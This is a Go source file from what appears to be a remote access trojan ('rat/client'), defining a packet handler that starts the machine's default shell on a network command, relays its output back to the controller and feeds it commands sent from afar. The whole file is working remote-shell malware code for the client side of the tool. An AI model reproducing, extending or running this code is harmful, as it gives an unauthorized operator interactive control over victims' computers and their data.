package main

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"rat/client/shell"
	"rat/shared"
)

type ShellPacket struct {
	Action int    `network:"receive"`
	Data   string `network:"send,receive"`
}

var current struct {
	process *exec.Cmd
	stdin   io.WriteCloser
	stdout  io.ReadCloser
}

func (packet ShellPacket) Header() shared.PacketHeader {
	return shared.ShellHeader
}

func (packet *ShellPacket) Init() {

}

func (packet ShellPacket) OnReceive() error {
	switch packet.Action {
	case shared.StartShell:
		current.process = exec.Command(shell.GetDefault())
		current.stdin, _ = current.process.StdinPipe()
		current.stdout, _ = current.process.StdoutPipe()

		current.process.Start()

		go func() {
			reader := bufio.NewReader(current.stdout)

			for {
				s, err := reader.ReadString('\n')
				if err != nil {
					fmt.Println(err.Error())
					break
				}

				Queue <- &ShellPacket{Data: s}
			}
		}()
	case shared.StopShell:
		current.process.Process.Kill()
		current.process = nil
	case shared.WriteShell:
		current.stdin.Write([]byte(packet.Data + shell.LineEnd))
	}

	return nil
}
